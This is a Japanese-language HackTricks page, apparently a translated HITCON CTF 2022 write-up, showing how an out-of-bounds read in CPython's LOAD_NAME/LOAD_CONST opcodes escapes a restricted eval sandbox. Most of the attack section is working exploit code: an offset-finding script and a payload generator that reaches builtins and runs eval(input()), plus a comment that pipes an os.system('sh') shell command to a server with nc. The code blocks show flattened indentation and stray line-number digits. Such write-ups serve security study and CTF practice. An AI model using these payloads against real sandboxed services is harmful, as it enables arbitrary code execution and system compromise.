# LOAD_NAME / LOAD_CONST opcode OOB Read

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)を**フォロー**する。
* **ハッキングトリックを共有するために、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する。

</details>

**この情報は** [**この解説**](https://blog.splitline.tw/hitcon-ctf-2022/) **から取得されました。**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

LOAD_NAME / LOAD_CONSTオペコードのOOBリード機能を使用して、メモリ内のシンボルを取得できます。つまり、`(a, b, c, ... 数百のシンボル ..., __getattribute__) if [] else [].__getattribute__(...)`のようなトリックを使用して、必要なシンボル（関数名など）を取得できます。

その後、エクスプロイトを作成します。

### 概要 <a href="#overview-1" id="overview-1"></a>

ソースコードは非常に短く、わずか4行しか含まれていません！
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

セグメンテーション違反はどのように発生しますか？

単純な例から始めましょう。 `[a, b, c]` は以下のバイトコードにコンパイルされる可能性があります。
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
しかし、`co_names` が空のタプルになった場合はどうなるでしょうか？ `LOAD_NAME 2` オペコードはまだ実行され、元々のメモリアドレスから値を読み取ろうとします。はい、これはアウト・オブ・バウンド・リードの「機能」です。

解決策のためのコアコンセプトはシンプルです。CPythonのいくつかのオペコード、例えば `LOAD_NAME` や `LOAD_CONST` は、OOBリードに脆弱です。

これらは、`consts` または `names` タプルからインデックス `oparg` のオブジェクトを取得します（これが `co_consts` と `co_names` が内部的に呼ばれるものです）。CPythonが `LOAD_CONST` オペコードを処理する際に何を行うかを確認するために、次の短いスニペットを参照できます。
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
### 攻撃手法の生成 <a href="#generating-the-exploit" id="generating-the-exploit"></a>

これにより、OOB機能を使用して任意のメモリオフセットから「name」を取得できます。その名前とオフセットを確認するには、単に `LOAD_NAME 0`、`LOAD_NAME 1` ... `LOAD_NAME 99` ... と試行し続けます。そして、おそらく oparg > 700 で何かを見つけることができるでしょう。もちろん、gdbを使用してメモリレイアウトを確認することもできますが、それがより簡単になるとは思いませんか？

取得したこれらの名前/定数の有用なオフセットを取得したら、そのオフセットから名前/定数を取得して使用するにはどうすればよいのでしょうか？ 以下はそのトリックです：\
`co_names=()` でオフセット5（`LOAD_NAME 5`）から `__getattribute__` 名を取得できると仮定して、次の手順を実行します：
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> `__getattribute__`という名前を付ける必要はなく、より短い名前やより奇妙な名前を付けることもできます

そのバイトコードを表示するだけで、その理由が理解できます：
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
`LOAD_ATTR`も`co_names`から名前を取得します。Pythonは名前が同じ場合、同じオフセットから名前を読み込みます。そのため、2番目の`__getattribute__`もオフセット5から読み込まれます。この特性を利用すると、メモリの近くに名前があれば任意の名前を使用できます。

数値を生成するのは簡単です:

* 0: not \[\[]]
* 1: not \[]
* 2: (not \[]) + (not \[])
* ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

長さ制限のため、constsは使用していません。

まず、名前のオフセットを見つけるためのスクリプトを以下に示します。
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
そして、以下は実際のPythonエクスプロイトを生成するためのものです。
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
それは基本的に、`__dir__` メソッドから取得した文字列に対して、以下のことを行います：
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)を**フォロー**する。
* **ハッキングトリックを共有するために、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する。

</details>
